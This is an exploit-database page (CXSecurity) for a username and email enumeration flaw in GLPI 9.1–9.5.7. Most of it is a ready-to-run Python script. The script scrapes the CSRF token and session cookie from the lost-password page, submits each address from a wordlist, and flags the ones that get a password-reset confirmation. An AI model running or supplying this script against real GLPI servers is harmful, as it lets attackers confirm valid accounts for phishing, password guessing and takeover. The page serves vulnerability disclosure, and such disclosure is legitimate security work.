---
title: GLPI 9.5.7 Username Enumeration
url: https://cxsecurity.com/issue/WLB-2023050002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:54.029734
---

# GLPI 9.5.7 Username Enumeration

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GLPI 9.5.7 Username Enumeration** **2023.05.03**  Credit:  **[Rafael B.](https://cxsecurity.com/author/Rafael%2BB./1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: GLPI 9.5.7 - Username Enumeration
# Date: 04/29/2023
# Author: Rafael B.
# Vendor Homepage: https://glpi-project.org/pt-br/
# Affected Versions: GLPI version 9.1 <= 9.5.7
# Software: https://github.com/glpi-project/glpi/releases/download/9.5.7/glpi-9.5.7.tgz
import requests
from bs4 import BeautifulSoup
# Send a GET request to the page to receive the csrf token and the cookie session
response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')
# Parse the HTML using BeautifulSoup
soup = BeautifulSoup(response.content, 'html.parser')
# Find the input element with the CSRF token
csrf\_input = soup.find('input', {'name': lambda n: n and n.startswith('\_glpi\_csrf\_')})
# Extract the CSRF token if it exists
if csrf\_input:
csrf\_token = csrf\_input['value']
# Extract the session cookie
session\_cookie\_value = None
if response.cookies:
session\_cookie\_value = next(iter(response.cookies.values()))
# Set the custom url where the GLPI recover password is located
url = "http://127.0.0.1:80/glpi/front/lostpassword.php"
headers = {"User-Agent": "Windows NT 10.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1", "Connection": "close", "Referer": "http://127.0.0.1/glpi/front/lostpassword.php?lostpassword=1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
# Open the email list file and read each line
with open('emails.txt', 'r') as f:
email\_list = f.readlines()
# Loop through the email list and make a POST request for each email
for email in email\_list:
email = email.strip()
data = {"email": email, "update": "Save", "\_glpi\_csrf\_token": csrf\_token}
cookies = {"glpi\_f6478bf118ca2449e9e40b198bd46afe": session\_cookie\_value}
freq = requests.post(url, headers=headers, cookies=cookies, data=data)
# Do a new GET request to get the updated CSRF token and session cookie for the next iteration
response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')
soup = BeautifulSoup(response.content, 'html.parser')
csrf\_input = soup.find('input', {'name': lambda n: n and n.startswith('\_glpi\_csrf\_')})
if csrf\_input:
csrf\_token = csrf\_input['value']
session\_cookie\_value = None
if response.cookies:
session\_cookie\_value = next(iter(response.cookies.values()))
# Parse the response and grep the match e-mails
soup = BeautifulSoup(freq.content, 'html.parser')
div\_center = soup.find('div', {'class': 'center'})
Result = (f"Email: {email}, Result: {div\_center.text.strip()}")
if "An email has been sent to your email address. The email contains information for reset your password." in Result:
print ("\033[1;32m Email Found! -> " + Result)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top